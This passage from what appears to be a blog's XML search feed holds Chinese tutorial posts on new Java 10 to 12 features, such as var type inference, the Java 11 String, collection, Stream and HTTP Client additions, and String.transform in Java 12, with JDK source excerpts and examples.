      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 10 的 10 个新特性，将彻底改变你写代码的方式</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java10/Java%2010%20%E7%9A%84%2010%20%E4%B8%AA%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%8C%E5%B0%86%E5%BD%BB%E5%BA%95%E6%94%B9%E5%8F%98%E4%BD%A0%E5%86%99%E4%BB%A3%E7%A0%81%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java10/Java%2010%20%E7%9A%84%2010%20%E4%B8%AA%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%8C%E5%B0%86%E5%BD%BB%E5%BA%95%E6%94%B9%E5%8F%98%E4%BD%A0%E5%86%99%E4%BB%A3%E7%A0%81%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-3-8/94675270.jpg" alt="image"></p><p>Java 9才发布几个月，很多玩意都没整明白，现在Java 10又快要来了。。</p><p>这时候我真尼玛想说：线上用的JDK 7 甚至JDK 6，JDK 8 还没用熟，JDK 9 才发布不久不知道啥玩意，JDK 10……</p><p>刚学Java的同学是不是感觉一脸蒙逼？！！！</p><p>就连我这个老司机也同样感觉如此！</p><p>Java 更新越来越快，我们做技术的也要跟上步伐，不然总会慢别人一拍，这新东西从国外到国内应用一般要好几年的时间，如果我们提前了解并应用这些新技术对自己不是坏事。</p><h3 id="Java-10的新特性"><a href="#Java-10的新特性" class="headerlink" title="Java 10的新特性"></a>Java 10的新特性</h3><p>说了这么多，看Java 10都会有哪些特性来改变我们写代码的方式呢？！</p><h4 id="1-局部变量类型推断"><a href="#1-局部变量类型推断" class="headerlink" title="1.局部变量类型推断"></a>1.局部变量类型推断</h4><p>局部变量类型推断可以说是Java 10中最值得注意的特性，这是Java语言开发人员为了简化Java应用程序的编写而采取的又一步，如下图所示。</p><p><img src="http://img.javastack.cn/18-3-8/56770623.jpg" alt="image"></p><p>这个新功能将为Java增加一些语法糖 - 简化它并改善开发者体验。新的语法将减少与编写Java相关的冗长度，同时保持对静态类型安全性的承诺。</p><p>局部变量类型推断将引入”var”关键字，也就是你可以随意定义变量而不必指定变量的类型，如：</p><pre class="line-numbers language-none"><code class="language-none">List &lt;String&gt; list &#x3D; new ArrayList &lt;String&gt;（）; Stream &lt;String&gt; stream &#x3D; getStream（）;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将被下面这个新语法所取代：</p><pre class="line-numbers language-none"><code class="language-none">var list &#x3D; new ArrayList &lt;String&gt;（）; var stream &#x3D; getStream（）;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看完是不是有点JS的即视感？？？越来越像JS了吗？！虽然类型推断在Java中不是一个新概念，但在局部变量中确是很大的一个改进。</p><p>说到类型推断，从JDK 5引进泛型，到JDK 7的”&lt;&gt;”操作符允许不绑定类型而初始化List，再到JDK 8的Lambda表达式，再到现在JDK 10的局部变量类型推断，Java类型推断正大刀阔斧的向前发展。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 该运算符允许在没有绑定ArrayList &lt;&gt;的类型的情况下初始化列表List &lt;String&gt; list &#x3D; new LinkedList &lt;&gt;（）;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>局部变量类型推荐仅限于如下使用场景：</strong></p><ul><li>局部变量初始化</li><li>for循环内部索引变量</li><li>传统的for循环声明变量</li></ul><p><strong>Java官方表示，它不能用于以下几个地方：</strong></p><ul><li>方法参数</li><li>构造函数参数</li><li>方法返回类型</li><li>字段</li><li>捕获表达式（或任何其他类型的变量声明）</li></ul><h4 id="2-GC改进和其他内务管理"><a href="#2-GC改进和其他内务管理" class="headerlink" title="2.GC改进和其他内务管理"></a>2.GC改进和其他内务管理</h4><p>JDK 10中有2个JEP专门用于改进当前的垃圾收集元素。</p><p>第一个垃圾收集器接口是（JEP 304），它将引入一个纯净的垃圾收集器接口，以帮助改进不同垃圾收集器的源代码隔离。</p><p>预定用于Java 10的第二个JEP是针对G1的并行完全GC（JEP 307），其重点在于通过完全GC并行来改善G1最坏情况的等待时间。G1是Java 9中的默认GC，并且此JEP的目标是使G1平行。</p><h4 id="3-线程本地握手（JEP-312）"><a href="#3-线程本地握手（JEP-312）" class="headerlink" title="3.线程本地握手（JEP 312）"></a>3.线程本地握手（JEP 312）</h4><p>JDK 10将引入一种在线程上执行回调的新方法，因此这将会很方便能停止单个线程而不是停止全部线程或者一个都不停。</p><h4 id="4-备用内存设备上的堆分配（JEP-316）"><a href="#4-备用内存设备上的堆分配（JEP-316）" class="headerlink" title="4.备用内存设备上的堆分配（JEP 316）"></a>4.备用内存设备上的堆分配（JEP 316）</h4><p>允许HotSpot VM在备用内存设备上分配Java对象堆内存，该内存设备将由用户指定。</p><h4 id="5-其他Unicode语言-标记扩展（JEP-314）"><a href="#5-其他Unicode语言-标记扩展（JEP-314）" class="headerlink" title="5.其他Unicode语言 - 标记扩展（JEP 314）"></a>5.其他Unicode语言 - 标记扩展（JEP 314）</h4><p>目标是增强java.util.Locale及其相关的API，以便实现语言标记语法的其他Unicode扩展（BCP 47）。</p><h4 id="6-基于Java的实验性JIT编译器（JEP-317）"><a href="#6-基于Java的实验性JIT编译器（JEP-317）" class="headerlink" title="6.基于Java的实验性JIT编译器（JEP 317）"></a>6.基于Java的实验性JIT编译器（JEP 317）</h4><p>Oracle希望将其Java JIT编译器Graal用作Linux &#x2F; x64平台上的实验性JIT编译器。</p><h4 id="7-根证书（JEP-319）"><a href="#7-根证书（JEP-319）" class="headerlink" title="7.根证书（JEP 319）"></a>7.根证书（JEP 319）</h4><p>这个的目标是在Oracle的Java SE中开源根证书。</p><h4 id="8-根证书认证程序（CA）"><a href="#8-根证书认证程序（CA）" class="headerlink" title="8.根证书认证程序（CA）"></a>8.根证书认证程序（CA）</h4><p>这将使OpenJDK对开发人员更具吸引力，它还旨在减少OpenJDK和Oracle JDK构建之间的差异。</p><h4 id="9-将JDK生态整合到单个存储库中（JEP-296）"><a href="#9-将JDK生态整合到单个存储库中（JEP-296）" class="headerlink" title="9.将JDK生态整合到单个存储库中（JEP 296）"></a>9.将JDK生态整合到单个存储库中（JEP 296）</h4><p>此JEP的主要目标是执行一些内存管理，并将JDK生态的众多存储库组合到一个存储库中。</p><h4 id="10-删除Native-Header生成工具（javah）（JEP-313）"><a href="#10-删除Native-Header生成工具（javah）（JEP-313）" class="headerlink" title="10.删除Native-Header生成工具（javah）（JEP 313）"></a>10.删除Native-Header生成工具（javah）（JEP 313）</h4><p>从JDK中移除了javah工具，这个很简单并且很重要。</p><h3 id="尝鲜"><a href="#尝鲜" class="headerlink" title="尝鲜"></a>尝鲜</h3><p>就像所有其他JDK版本一样，Oracle已经发布了一个Java 10初始候选版本，Java开发者可以下载此版本用来测试新功能。如果你对Java 10抱有期待想提早尝试，那么现在就开始吧！</p><blockquote><p>尝鲜地址：<a href="http://openjdk.java.net/projects/jdk/10/">http://openjdk.java.net/projects/jdk/10/</a></p></blockquote><h4 id="最后的感悟"><a href="#最后的感悟" class="headerlink" title="最后的感悟"></a>最后的感悟</h4><p>对于第一点新特性来说确实是一个大的跨越，其他特性或多或少都能带给开发者福音。但最终Java 10会是什么样，或许还会增加更多实用性的新功能或者优化，我们还得期待！</p><p>现在要做的就是，赶紧熟悉JDK 8，现在已经是很多互联网企业标配了。如果还在使用JDK4-7，那真的是要OUT了。。</p><p>在不久的将来，Java 10将彻底改变你写代码的方式！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 11 已发布，String 还能这样玩</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java11/Java%2011%20%E5%B7%B2%E5%8F%91%E5%B8%83%EF%BC%8CString%20%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java11/Java%2011%20%E5%B7%B2%E5%8F%91%E5%B8%83%EF%BC%8CString%20%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9/</url>
      
        <content type="html"><![CDATA[<p>在文章《<a href="https://mp.weixin.qq.com/s/SXEqAmfbmK4NklihukbE-Q">Java 11 正式发布，这 8 个逆天新特性教你写出更牛逼的代码</a>》中，我有介绍到 Java 11 的八个新特性，其中关于 String 加强部分，我觉得有点意思，这里单独再拉出来讲。</p><p><strong>Java 11 增加了一系列的字符串处理方法，如以下所示。</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 判断字符串是否为空白&quot; &quot;.isBlank();                &#x2F;&#x2F; true&#x2F;&#x2F; 去除首尾空格&quot; Javastack &quot;.strip();          &#x2F;&#x2F; &quot;Javastack&quot;&#x2F;&#x2F; 去除尾部空格 &quot; Javastack &quot;.stripTrailing();  &#x2F;&#x2F; &quot; Javastack&quot;&#x2F;&#x2F; 去除首部空格 &quot; Javastack &quot;.stripLeading();   &#x2F;&#x2F; &quot;Javastack &quot;&#x2F;&#x2F; 复制字符串&quot;Java&quot;.repeat(3);             &#x2F;&#x2F; &quot;JavaJavaJava&quot;&#x2F;&#x2F; 行数统计&quot;A\nB\nC&quot;.lines().count();    &#x2F;&#x2F; 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最有意思的是 <code>repeat</code> 和 <code>lines</code> 方法了，来看下还能怎么玩！</p><h4 id="repeat"><a href="#repeat" class="headerlink" title="repeat"></a>repeat</h4><p>repeat 方法的作用就是重复一个字符串 N 遍，可以用来代替工具类：<code>org.apache.commons.lang3.StringUtils#repeat(java.lang.String, int)</code>，来看下 <code>repeat</code> 的源码。</p><pre class="line-numbers language-none"><code class="language-none">public String repeat(int count) &#123;    if (count &lt; 0) &#123;        throw new IllegalArgumentException(&quot;count is negative: &quot; + count);    &#125;    if (count &#x3D;&#x3D; 1) &#123;        return this;    &#125;    final int len &#x3D; value.length;    if (len &#x3D;&#x3D; 0 || count &#x3D;&#x3D; 0) &#123;        return &quot;&quot;;    &#125;    if (len &#x3D;&#x3D; 1) &#123;        final byte[] single &#x3D; new byte[count];        Arrays.fill(single, value[0]);        return new String(single, coder);    &#125;    if (Integer.MAX_VALUE &#x2F; count &lt; len) &#123;        throw new OutOfMemoryError(&quot;Repeating &quot; + len + &quot; bytes String &quot; + count +                &quot; times will produce a String exceeding maximum size.&quot;);    &#125;    final int limit &#x3D; len * count;    final byte[] multiple &#x3D; new byte[limit];    System.arraycopy(value, 0, multiple, 0, len);    int copied &#x3D; len;    for (; copied &lt; limit - copied; copied &lt;&lt;&#x3D; 1) &#123;        System.arraycopy(multiple, 0, multiple, copied, copied);    &#125;    System.arraycopy(multiple, 0, multiple, copied, limit - copied);    return new String(multiple, coder);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来看下更多的用法。</p><pre class="line-numbers language-none"><code class="language-none">String str &#x3D; &quot;Java&quot;;&#x2F;&#x2F; 小于0：java.lang.IllegalArgumentExceptionSystem.out.println(str.repeat(-2));&#x2F;&#x2F; 等于0：空白串（&quot;&quot;）System.out.println(str.repeat(0));&#x2F;&#x2F; JavaJavaJavaSystem.out.println(str.repeat(3));&#x2F;&#x2F; java.lang.OutOfMemoryErrorSystem.out.println(str.repeat(Integer.MAX_VALUE));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以说 repeat 并不是可以无限增长的，有使用限制的，达到一定量就会报内存溢出异常。</p><h4 id="lines"><a href="#lines" class="headerlink" title="lines"></a>lines</h4><pre class="line-numbers language-none"><code class="language-none">public Stream&lt;String&gt; lines() &#123;    return isLatin1() ? StringLatin1.lines(value)                      : StringUTF16.lines(value);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>lines 方法返回一个字符串 Stream, 可以识别 <code>\n</code> 和 <code>\r</code> 换行符换行。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 4System.out.println(&quot;A\nB\nC\rD&quot;.lines().count());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是不是很好？在将来肯定有武之地！如批量读取文件内容到一个 Stream 中，就能很好的识别行结束符了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 11 正式发布，这 8 个新特性教你写出更牛逼的代码</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java11/Java%2011%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%8C%E8%BF%99%208%20%E4%B8%AA%E6%96%B0%E7%89%B9%E6%80%A7%E6%95%99%E4%BD%A0%E5%86%99%E5%87%BA%E6%9B%B4%E7%89%9B%E9%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java11/Java%2011%20%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83%EF%BC%8C%E8%BF%99%208%20%E4%B8%AA%E6%96%B0%E7%89%B9%E6%80%A7%E6%95%99%E4%BD%A0%E5%86%99%E5%87%BA%E6%9B%B4%E7%89%9B%E9%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>美国时间 09 月 25 日，Oralce 正式发布了 Java 11，这是据 Java 8 以后支持的首个长期版本。</p><p>为什么说是长期版本，看下面的官方发布的支持路线图表。</p><p><img src="http://qianniu.javastack.cn/18-9-26/91229065.jpg"></p><p>可以看出 Java 8 扩展支持到 2025 年，而 Java 11 扩展支持到 2026 年。</p><p>现在大部分都在用 Java 8，Java 9 和 10 目前很少有人在用，至少我没有发现有公司在生产环境应用的，那就是找死。</p><p>现在 Java 11 长期支持，也已经包含了 9 和 10 的全部功能，9 和 10 自然就活到头了。。</p><p>那么我们来看下 从 Java 9 - 11 都有哪些重要的新特性呢？</p><h4 id="1、本地变量类型推断"><a href="#1、本地变量类型推断" class="headerlink" title="1、本地变量类型推断"></a>1、本地变量类型推断</h4><p>这个博主已经写过一篇文章，详细的介绍了 Java 10 带来的这个新特性。</p><p>什么是局部变量类型推断？</p><pre class="line-numbers language-none"><code class="language-none">var javastack &#x3D; &quot;javastack&quot;;System.out.println(javastack);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>大家看出来了，局部变量类型推断就是左边的类型直接使用 <code>var</code> 定义，而不用写具体的类型，编译器能根据右边的表达式自动推断类型，如上面的 <code>String</code> 。</p><pre class="line-numbers language-none"><code class="language-none">var javastack &#x3D; &quot;javastack&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就等于：</p><pre class="line-numbers language-none"><code class="language-none">String javastack &#x3D; &quot;javastack&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更多使用详情请参考这篇文章《<a href="https://mp.weixin.qq.com/s/4zUtQPUn5LYw43IRLm0Dwg">Java 10 实战第 1 篇：局部变量类型推断</a>》，这里不再重复了。</p><h4 id="2、字符串加强"><a href="#2、字符串加强" class="headerlink" title="2、字符串加强"></a>2、字符串加强</h4><p>Java 11 增加了一系列的字符串处理方法，如以下所示。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 判断字符串是否为空白&quot; &quot;.isBlank();                &#x2F;&#x2F; true&#x2F;&#x2F; 去除首尾空格&quot; Javastack &quot;.strip();          &#x2F;&#x2F; &quot;Javastack&quot;&#x2F;&#x2F; 去除尾部空格 &quot; Javastack &quot;.stripTrailing();  &#x2F;&#x2F; &quot; Javastack&quot;&#x2F;&#x2F; 去除首部空格 &quot; Javastack &quot;.stripLeading();   &#x2F;&#x2F; &quot;Javastack &quot;&#x2F;&#x2F; 复制字符串&quot;Java&quot;.repeat(3);             &#x2F;&#x2F; &quot;JavaJavaJava&quot;&#x2F;&#x2F; 行数统计&quot;A\nB\nC&quot;.lines().count();    &#x2F;&#x2F; 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、集合加强"><a href="#3、集合加强" class="headerlink" title="3、集合加强"></a>3、集合加强</h4><p>自 Java 9 开始，Jdk 里面为集合（List&#x2F; Set&#x2F; Map）都添加了 <code>of</code> 和 <code>copyOf</code> 方法，它们两个都用来创建不可变的集合，来看下它们的使用和区别。</p><p><strong>示例1：</strong></p><pre class="line-numbers language-none"><code class="language-none">var list &#x3D; List.of(&quot;Java&quot;, &quot;Python&quot;, &quot;C&quot;);var copy &#x3D; List.copyOf(list);System.out.println(list &#x3D;&#x3D; copy);   &#x2F;&#x2F; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>示例2：</strong></p><pre class="line-numbers language-none"><code class="language-none">var list &#x3D; new ArrayList&lt;String&gt;();var copy &#x3D; List.copyOf(list);System.out.println(list &#x3D;&#x3D; copy);   &#x2F;&#x2F; false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>示例1和2代码差不多，为什么一个为true,一个为false?</p><p>来看下它们的源码：</p><pre class="line-numbers language-none"><code class="language-none">static &lt;E&gt; List&lt;E&gt; of(E... elements) &#123;    switch (elements.length) &#123; &#x2F;&#x2F; implicit null check of elements        case 0:            return ImmutableCollections.emptyList();        case 1:            return new ImmutableCollections.List12&lt;&gt;(elements[0]);        case 2:            return new ImmutableCollections.List12&lt;&gt;(elements[0], elements[1]);        default:            return new ImmutableCollections.ListN&lt;&gt;(elements);    &#125;&#125;static &lt;E&gt; List&lt;E&gt; copyOf(Collection&lt;? extends E&gt; coll) &#123;    return ImmutableCollections.listCopy(coll);&#125;static &lt;E&gt; List&lt;E&gt; listCopy(Collection&lt;? extends E&gt; coll) &#123;    if (coll instanceof AbstractImmutableList &amp;&amp; coll.getClass() !&#x3D; SubList.class) &#123;        return (List&lt;E&gt;)coll;    &#125; else &#123;        return (List&lt;E&gt;)List.of(coll.toArray());    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出 <code>copyOf</code> 方法会先判断来源集合是不是 <code>AbstractImmutableList</code> 类型的，如果是，就直接返回，如果不是，则调用 <code>of</code> 创建一个新的集合。</p><p>示例2因为用的 new 创建的集合，不属于不可变 <code>AbstractImmutableList</code> 类的子类，所以 <code>copyOf</code> 方法又创建了一个新的实例，所以为false.</p><blockquote><p>注意：使用 of 和 copyOf 创建的集合为不可变集合，不能进行添加、删除、替换、排序等操作，不然会报 <code>java.lang.UnsupportedOperationException</code> 异常。</p></blockquote><p>上面演示了 List 的 of 和 copyOf 方法，Set 和 Map 接口都有。</p><h4 id="4、Stream-加强"><a href="#4、Stream-加强" class="headerlink" title="4、Stream 加强"></a>4、Stream 加强</h4><p>Stream 是 Java 8 中的新特性，Java 9 开始对 Stream 增加了以下 4 个新方法。</p><ol><li>增加单个参数构造方法，可为null</li></ol><pre class="line-numbers language-none"><code class="language-none">Stream.ofNullable(null).count(); &#x2F;&#x2F; 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>增加 takeWhile 和 dropWhile 方法</li></ol><pre class="line-numbers language-none"><code class="language-none">Stream.of(1, 2, 3, 2, 1)    .takeWhile(n -&gt; n &lt; 3)    .collect(Collectors.toList());  &#x2F;&#x2F; [1, 2]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>从开始计算，当 n &lt; 3 时就截止。</p><pre class="line-numbers language-none"><code class="language-none">Stream.of(1, 2, 3, 2, 1)    .dropWhile(n -&gt; n &lt; 3)    .collect(Collectors.toList());  &#x2F;&#x2F; [3, 2, 1]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个和上面的相反，一旦 n &lt; 3 不成立就开始计算。</p><p>3）iterate重载</p><p>这个 iterate 方法的新重载方法，可以让你提供一个 Predicate (判断条件)来指定什么时候结束迭代。</p><p>如果你对 JDK 8 中的 Stream 还不熟悉，可以看之前分享的这一系列教程。</p><h4 id="5、Optional-加强"><a href="#5、Optional-加强" class="headerlink" title="5、Optional 加强"></a>5、Optional 加强</h4><p>Opthonal 也增加了几个非常酷的方法，现在可以很方便的将一个 Optional 转换成一个 Stream, 或者当一个空 Optional 时给它一个替代的。</p><pre class="line-numbers language-none"><code class="language-none">Optional.of(&quot;javastack&quot;).orElseThrow();     &#x2F;&#x2F; javastackOptional.of(&quot;javastack&quot;).stream().count();  &#x2F;&#x2F; 1Optional.ofNullable(null)    .or(() -&gt; Optional.of(&quot;javastack&quot;))    .get();   &#x2F;&#x2F; javastack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6、InputStream-加强"><a href="#6、InputStream-加强" class="headerlink" title="6、InputStream 加强"></a>6、InputStream 加强</h4><p>InputStream 终于有了一个非常有用的方法：transferTo，可以用来将数据直接传输到 OutputStream，这是在处理原始数据流时非常常见的一种用法，如下示例。</p><pre class="line-numbers language-none"><code class="language-none">var classLoader &#x3D; ClassLoader.getSystemClassLoader();var inputStream &#x3D; classLoader.getResourceAsStream(&quot;javastack.txt&quot;);var javastack &#x3D; File.createTempFile(&quot;javastack2&quot;, &quot;txt&quot;);try (var outputStream &#x3D; new FileOutputStream(javastack)) &#123;    inputStream.transferTo(outputStream);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="7、HTTP-Client-API"><a href="#7、HTTP-Client-API" class="headerlink" title="7、HTTP Client API"></a>7、HTTP Client API</h4><p>这是 Java 9 开始引入的一个处理 HTTP 请求的的孵化 HTTP Client  API，该 API 支持同步和异步，而在 Java 11 中已经为正式可用状态，你可以在 <code>java.net</code> 包中找到这个 API。</p><p>来看一下 HTTP Client 的用法：</p><pre class="line-numbers language-none"><code class="language-none">var request &#x3D; HttpRequest.newBuilder()    .uri(URI.create(&quot;https:&#x2F;&#x2F;javastack.cn&quot;))    .GET()    .build();var client &#x3D; HttpClient.newHttpClient();&#x2F;&#x2F; 同步HttpResponse&lt;String&gt; response &#x3D; client.send(request, HttpResponse.BodyHandlers.ofString());System.out.println(response.body());&#x2F;&#x2F; 异步client.sendAsync(request, HttpResponse.BodyHandlers.ofString())    .thenApply(HttpResponse::body)    .thenAccept(System.out::println);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的 <code>.GET()</code> 可以省略，默认请求方式为 Get！</p><p>更多使用示例可以看这个 API，后续有机会再做演示。</p><p>现在 Java 自带了这个 HTTP Client API，我们以后还有必要用 Apache 的 HttpClient 工具包吗？</p><h4 id="8、化繁为简，一个命令编译运行源代码"><a href="#8、化繁为简，一个命令编译运行源代码" class="headerlink" title="8、化繁为简，一个命令编译运行源代码"></a>8、化繁为简，一个命令编译运行源代码</h4><p>看下面的代码。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 编译javac Javastack.java&#x2F;&#x2F; 运行java Javastack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在我们的认知里面，要运行一个 Java 源代码必须先编译，再运行，两步执行动作。而在未来的 Java 11 版本中，通过一个 <code>java</code> 命令就直接搞定了，如以下所示。</p><pre class="line-numbers language-none"><code class="language-none">java Javastack.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="更多新特性"><a href="#更多新特性" class="headerlink" title="更多新特性"></a>更多新特性</h4><ul><li>Flow API for reactive programming</li><li>Java Module System</li><li>Application Class Data Sharing</li><li>Dynamic Class-File Constants</li><li>Java REPL (JShell)</li><li>Flight Recorder</li><li>Unicode 10</li><li>G1: Full Parallel Garbage Collector</li><li>ZGC: Scalable Low-Latency Garbage Collector</li><li>Epsilon: No-Op Garbage Collector</li><li>Deprecate the Nashorn JavaScript Engine</li><li>…</li></ul><h4 id="历史新特性文章"><a href="#历史新特性文章" class="headerlink" title="历史新特性文章"></a>历史新特性文章</h4><ul><li>Java 11 要来了，编译运行一个命令搞定</li><li>JDK 11 发布计划来了，已确定 3个 新特性</li><li>Java 10 实战第 1 篇：局部变量类型推断</li><li>JDK 5 ~ 10 新特性倾情整理</li><li>JDK 10 的 10 个新特性</li><li>JDK 10 最重要的 5 个新特性</li><li>JDK 9 的 9 个新特性</li><li>JDK 9 新特性实战：简化流关闭新姿势</li><li>JDK 8 的排序大法</li><li>JDK 8 新特性之 Lambda 表达式</li><li>JDK 8 新特性之函数式接口</li><li>JDK 8 新特性之方法引用</li><li>JDK 8 新特性之接口默认方法与静态方法</li><li>JDK 8 新特性之 Optional</li><li>JDK 8 新特性之重复注解</li><li>JDK 8 新特性之 Stream 流</li><li>JDK 8 新特性之 Stream 流（一）基础体验</li><li>JDK 8 新特性之 Stream 流（二）关键知识点</li><li>JDK 8 新特性之 Stream 流（三）缩减操作</li><li>JDK 8 新特性之 Stream 流（四）并行流</li><li>JDK 8 新特性之 Stream 流（五）映射</li><li>JDK 8 新特性之 Stream 流（六）收集缩</li><li>JDK 8 新特性之 Stream 流（七）流与迭代器</li><li>JDK 8 新特性之扩展篇</li></ul><h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><p>现在许多人还在使用 Java 8 或者 7，不过 8 在 2019 年初就会结束免费更新。现在 11 是长期支持版本，正是学习和上手 11 的好时机，写这篇文章希望能对你有所启发。</p><p>如果你喜欢的我的文章，对你有帮助，点赞转发支持一下吧~</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 12 骚操作， String居然还能这样玩</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java12/Java%2012%20%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%20String%E5%B1%85%E7%84%B6%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java12/Java%2012%20%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%20String%E5%B1%85%E7%84%B6%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9/</url>
      
        <content type="html"><![CDATA[<p>Java 13 都快要来了，12必须跟栈长学起！</p><p><a href="https://mp.weixin.qq.com/s/Gg6KKz7vhDRpzeMR8CG4DA">Java 13 即将发布，新特性必须抢先看！</a></p><p>Java 12 已经发布数月了：<a href="https://mp.weixin.qq.com/s/IXOoSTq6qi4ZH63gCaKa3A">Java 12 正式发布，8大新特性！</a>，今天我再来分享下在 Java 12 中关于 String 的三个骚操作，绝逼有用。</p><p>更多关于 Java 的资讯、干货教程、以及好消息，请关注，第一时间推送。</p><p>坐稳了，准备起飞！</p><h2 id="1、transform"><a href="#1、transform" class="headerlink" title="1、transform"></a>1、transform</h2><p>transform：即字符串转换，来看下 transform 的实现源码：</p><pre class="line-numbers language-none"><code class="language-none">public &lt;R&gt; R transform(Function&lt;? super String, ? extends R&gt; f) &#123;    return f.apply(this);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>传入一个函数式接口 Function，接受一个值，返回一个值，参考：<a href="https://mp.weixin.qq.com/s/nC3f17zZlXC08XNJWA-FBw">Java 8 新特性之函数式接口</a>。</p><p>废话少说，直接上手就是干：</p><pre class="line-numbers language-none"><code class="language-none">private static void testTransform() &#123;    System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;test java 12 transform&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);    List&lt;String&gt; list1 &#x3D; List.of(&quot;Java&quot;, &quot; Python&quot;, &quot; C++ &quot;);    List&lt;String&gt; list2 &#x3D; new ArrayList&lt;&gt;();    list1.forEach(element -&gt;            list2.add(element.transform(String::strip)                    .transform(String::toUpperCase)                    .transform((e) -&gt; &quot;Hi,&quot; + e))    );    list2.forEach(System.out::println);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果输出：</p><pre class="line-numbers language-none"><code 